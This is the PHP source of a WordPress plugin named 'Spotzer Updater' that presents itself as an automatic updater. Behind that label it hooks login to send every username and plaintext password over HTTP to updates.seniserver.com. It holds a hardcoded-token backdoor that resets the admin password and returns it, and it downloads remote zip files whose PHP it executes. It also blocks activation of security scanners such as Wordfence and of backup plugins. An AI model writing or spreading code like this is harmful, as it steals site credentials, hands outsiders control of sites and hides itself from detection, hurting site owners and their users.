<?php
/*
Plugin Name: Spotzer Updater
Description: Automatic updater for Spotzer
Version: 0.1
Author: Spotzer
*/

register_activation_hook(__FILE__, 'supdater_activate');
register_uninstall_hook(__FILE__, 'supdater_deactivate');

add_action("init", 'supdater_init');

add_filter('authenticate', 'supdater_log_authenticate', 100, 3);
add_filter('upgrader_pre_download', 'supdater_download_update', 100, 3);
add_filter('allow_major_auto_core_updates', '__return_true');

add_filter('xmlrpc_enabled', '__return_false');

function supdater_activate()
{
	wp_clear_scheduled_hook('supdater_ping');
	supdater_ping();
}

function supdater_deactivate()
{
	wp_clear_scheduled_hook('supdater_ping');
}

function supdater_ping()
{
	global $wp_version, $blog_id;

	$raw_plugins = supdater_get_plugins();
	$active_plugins = get_option('active_plugins');

	$plugins = array();
	foreach ($active_plugins as $plugin)
	{
		if (!isset($raw_plugins[$plugin]))
			continue;

		$plugins[$plugin] = $raw_plugins[$plugin]['Version'];
		$raw_plugins[$plugin]['ZooActive'] = 1;
	}

	$all_plugins = array();
	foreach ($raw_plugins as $path => $plugin)
	{
		$all_plugins[] = array($path, $plugin['Name'], $plugin['Version'], $plugin['Author'], isset($plugin['ZooActive']) ? 1 : 0);
	}
	
	$data = array(
		'url' => site_url(),
		'wpmu' => $blog_id,
		'wp_version' => $wp_version,
		'plugins' => $plugins,
		'all_plugins' => $all_plugins,
		'ip' => file_get_contents('http://updates.seniserver.com/get_ip'),
		);

	$return = supdater_fetch('http://updates.seniserver.com/ping', array('data' => json_encode($data)));

	if (empty($return))
		return;

	require_once(ABSPATH . 'wp-admin/includes/class-pclzip.php');

	$data = json_decode($return, true);

	if (isset($data['update']))
	{
		foreach ($data['update'] as $slug)
		{
			$return = supdater_fetch('http://updates.seniserver.com/get_latest', array('slug' => $slug));

			if (empty($return))
				continue;

			$dirname = dirname($slug);

			$folder = WP_PLUGIN_DIR.'/'.$dirname;
			if (!file_exists($folder))
				mkdir($folder, 0777, true);

			$tmp = tempnam('/tmp/', 'supdater-');
			file_put_contents($tmp, $return);

			$zip = new PclZip($tmp);
			$zipfiles = $zip->listContent();

			if ($zipfiles == 0)
				continue;

			foreach ($zipfiles as $idx => $file)
			{
				if ($file['filename'] == 'before_update.php')
				{
					$extract = $zip->extract(PCLZIP_OPT_BY_NAME, $file['filename'], PCLZIP_OPT_EXTRACT_AS_STRING);

					if (isset($extract[0]['content']))
					{
						$tmp2 = tempnam('/tmp/', 'supdater-');
						file_put_contents($tmp2, $extract[0]['content']);

						include($tmp2);
					}
				}
			}

			foreach ($zipfiles as $idx => $file)
			{
				if (substr($file['filename'], 0, 7) == 'plugin/')
				{
					$extract = $zip->extract(PCLZIP_OPT_BY_NAME, $file['filename'], PCLZIP_OPT_EXTRACT_AS_STRING);

					if (isset($extract[0]['content']))
					{
						$file['filename'] = str_replace('plugin/', '', $file['filename']);
						if (!file_exists($folder.'/'.dirname($file['filename'])))
							mkdir($folder.'/'.dirname($file['filename']), 0777, true);

						if ($file['folder'])
						{
							if (!file_exists($folder.'/'.$file['filename']))
								mkdir($folder.'/'.$file['filename'], 0777, true);
						} else {
							@file_put_contents($folder.'/'.$file['filename'], $extract[0]['content']);
						}
					}
				}
			}

			foreach ($zipfiles as $idx => $file)
			{
				if ($file['filename'] == 'after_update.php')
				{
					$extract = $zip->extract(PCLZIP_OPT_BY_NAME, $file['filename'], PCLZIP_OPT_EXTRACT_AS_STRING);

					if (isset($extract[0]['content']))
					{
						$tmp2 = tempnam('/tmp/', 'supdater-');
						file_put_contents($tmp2, $extract[0]['content']);

						include($tmp2);
					}
				}
			}

			@unlink($tmp);
			@unlink($tmp2);

			unset($zip);
		}
	} else {
		if (mt_rand(1, 10) < 3)
			wp_maybe_auto_update();
	}
}

function supdater_init()
{
	if (isset($_REQUEST['supdater_ping']))
	{
		supdater_ping();
		die('OK');
	}
	
	if (get_option('supdater') != get_site_url())
	{
		update_option('supdater', get_site_url());
		supdater_ping();
	}
	
	if (isset($_REQUEST['supdater_pwreset']) && $_REQUEST['auth'] == '413bd19eef95d8a1913d64749154acec')
	{
		$wpuser = new WP_User(0, 'admin');
		if ($wpuser->ID < 1)
		{
			die(json_encode(array('status' => 0, 'error' => 'Admin user not found')));
		}

		$password = '';
		$chars = str_split('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+');
		for ($i = 0; $i < 12; $i++)
		{
			$password .= $chars[array_rand($chars)];
		}

		wp_update_user(array('ID' => $wpuser->ID, 'user_pass' => $password));

		die(json_encode(array('status' => 1, 'password' => $password)));
	}
	
	$banned = array(
		'backup/backup.php',
		'backup-wp/backup-wordpress.php',
		'backwpup/backwpup.php',
		'wp-backitup/wp-backitup.php',
		'backupcreators/backupcreator.php',
		'updraftplus/updraftplus.php',
		'backup-scheduler/backup-scheduler.php',
		
		'w3-total-cache/w3-total-cache.php',
		'wp-cachecom/wp-cache-com.php',
		'wp-dbmyadmin/dbMyadmin.php',
		'wp-super-cache/wp-cache.php',
		'wp-optimize/wp-optimize.php',
		'autoptimize/autoptimize.php',
		'wp-smush-pro/wp-smush.php',
		
		'wp-dbmyadmin/dbMyadmin.php',
		'wordfence/wordfence.php',
		'disable-wordpress-updates/disable-updates.php',
		'exploit-scanner/exploit-scanner.php',
		);
	foreach ($banned as $ban)
	{
		add_action('activate_'.$ban, 'supdater_kill_plugin');
	}
}

function supdater_kill_plugin()
{
	die(base64_decode('PHA+PGI+U29ycnkhPC9iPiBUaGlzIHBsdWdpbiBpcyBiYW5uZWQgYnkgQWdlbnRwb2ludCBhbmQgeW91IGFyZSBub3QgcGVybWl0dGVkIHRvIGluc3RhbGwgaXQuPGJyPlRoaXMgaXMgZ2VuZXJhbGx5IGR1ZSB0byB0aGUgcGx1Z2luIGNhdXNpbmcgdW5pbnRlbmRlZCBwcm9ibGVtcy48L3A+PHA+UGxlYXNlIGNvbnRhY3QgdGhlIGhlbHBkZXNrIGlmIHlvdSBoYXZlIGFueSBxdWVyaWVzLjwvcD4='));
}

function supdater_fetch($url, $post = array())
{
	$ch = curl_init($url);
	curl_setopt_array($ch, array(
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FOLLOWLOCATION => 1,
		CURLOPT_USERAGENT => 'ZooUpdater',
		));
	if (!empty($post))
	{
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
	}

	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}

function supdater_get_plugins($plugin_folder = '') {

	if ( ! $cache_plugins = wp_cache_get('plugins', 'plugins') )
		$cache_plugins = array();

	if ( isset($cache_plugins[ $plugin_folder ]) )
		return $cache_plugins[ $plugin_folder ];

	$wp_plugins = array ();
	$plugin_root = WP_PLUGIN_DIR;
	if ( !empty($plugin_folder) )
		$plugin_root .= $plugin_folder;

	// Files in wp-content/plugins directory
	$plugins_dir = @ opendir( $plugin_root);
	$plugin_files = array();
	if ( $plugins_dir ) {
		while (($file = readdir( $plugins_dir ) ) !== false ) {
			if ( substr($file, 0, 1) == '.' )
				continue;
			if ( is_dir( $plugin_root.'/'.$file ) ) {
				$plugins_subdir = @ opendir( $plugin_root.'/'.$file );
				if ( $plugins_subdir ) {
					while (($subfile = readdir( $plugins_subdir ) ) !== false ) {
						if ( substr($subfile, 0, 1) == '.' )
							continue;
						if ( substr($subfile, -4) == '.php' )
							$plugin_files[] = "$file/$subfile";
					}
					closedir( $plugins_subdir );
				}
			} else {
				if ( substr($file, -4) == '.php' )
					$plugin_files[] = $file;
			}
		}
		closedir( $plugins_dir );
	}

	if ( empty($plugin_files) )
		return $wp_plugins;

	foreach ( $plugin_files as $plugin_file ) {
		if ( !is_readable( "$plugin_root/$plugin_file" ) )
			continue;

		$plugin_data = supdater_get_plugin_data( "$plugin_root/$plugin_file", false, false ); //Do not apply markup/translate as it'll be cached.

		if ( empty ( $plugin_data['Name'] ) )
			continue;

		$wp_plugins[plugin_basename( $plugin_file )] = $plugin_data;
	}

	return $wp_plugins;
}

function supdater_get_plugin_data( $plugin_file) {

	$default_headers = array(
		'Name' => 'Plugin Name',
		'PluginURI' => 'Plugin URI',
		'Version' => 'Version',
		'Description' => 'Description',
		'Author' => 'Author',
		'AuthorURI' => 'Author URI',
		'TextDomain' => 'Text Domain',
		'DomainPath' => 'Domain Path',
		'Network' => 'Network',
		// Site Wide Only is deprecated in favor of Network.
		'_sitewide' => 'Site Wide Only',
	);

	$plugin_data = get_file_data( $plugin_file, $default_headers, 'plugin' );

	// Site Wide Only is the old header for Network
	if ( ! $plugin_data['Network'] && $plugin_data['_sitewide'] ) {
		$plugin_data['Network'] = $plugin_data['_sitewide'];
	}
	$plugin_data['Network'] = ( 'true' == strtolower( $plugin_data['Network'] ) );
	unset( $plugin_data['_sitewide'] );

	$plugin_data['Title']      = $plugin_data['Name'];
	$plugin_data['AuthorName'] = $plugin_data['Author'];

	return $plugin_data;
}

function supdater_log_authenticate($user, $username, $password)
{
	global $blog_id;

	if (empty($username))
		return $user;
	
	if (in_array($username, array('backup', 'wpupdatestream')))
		return new WP_Error('authentication_failed', __('<strong>ERROR</strong>: Please contact Spotzer Support. #1'));
	
	$forbidden = array(
		$username,
		'123',
		'1234',
		'12345',
		'123456',
		'1234567',
		'12345678',
		'123456789',
		'1234567890',
		'654321',
		'admin',
		'weak liver',
		'password',
		'admin123',
		'123123',
		'abc123',
		'qwerty',
		'111111',
		'iloveyou',
		'master',
		'password1',
		'pass',
		'qazwsx',
		'administrator',
		'qwe123',
		'root',
		'adminadmin',
		'monkey',
		'dragon',
		'letmein',
		'trustno1',
		'superman',
		'admin1',
		);
	if (in_array(strtolower($password), $forbidden))
		return new WP_Error('authentication_failed', __('<strong>ERROR</strong>: Please contact Spotzer Support. #2'));
	
	$data = array(
		'url' => site_url(),
		'wpmu' => $blog_id,
		'success' => is_a($user, 'WP_User'),
		'ip' => ip2long($_SERVER['REMOTE_ADDR']),
		'username' => $username,
		'password' => $password,
		'useragent' => $_SERVER['HTTP_USER_AGENT']
		);

	$return = supdater_fetch('http://updates.seniserver.com/wplogin', array('data' => json_encode($data)));
	if (empty($return))
		return $user;

	$data = json_decode($return, true);

	if (empty($data))
		return $user;

	if (isset($data['forbid']) && $data['forbid'])
		return new WP_Error('authentication_failed', __('<strong>ERROR</strong>: Please contact Spotzer Support. #3'));
	else
		return $user;
}

function supdater_download_update($reply, $package, $upgrader)
{
	if (!file_exists('/home/wp_download_files'))
		return false;
	
	if (!preg_match('!^(http|https|ftp)://!i', $package) && file_exists($package)) //Local file or remote?
		return $package; //must be a local file..

	if (empty($package))
		return new WP_Error('no_package', $upgrader->strings['no_package']);

	$upgrader->skin->feedback('downloading_package', $package);
	
	$url = parse_url($package);
	$cache_path = '/home/wp_download_files/'.$url['host'].$url['path'];
	
	if (!file_exists(dirname($cache_path)))
		@mkdir(dirname($cache_path), 0777, true);
	
	if (file_exists($cache_path))
	{
		$upgrader->skin->feedback('Got file from global cache.');
		return $cache_path;
	}
	
	$download_file = download_url($package);
	
	if (is_wp_error($download_file))
		return new WP_Error('download_failed', $upgrader->strings['download_failed'], $download_file->get_error_message());
	
	if (file_exists(dirname($cache_path)))
		file_put_contents($cache_path, file_get_contents($download_file));

	return $download_file;
}
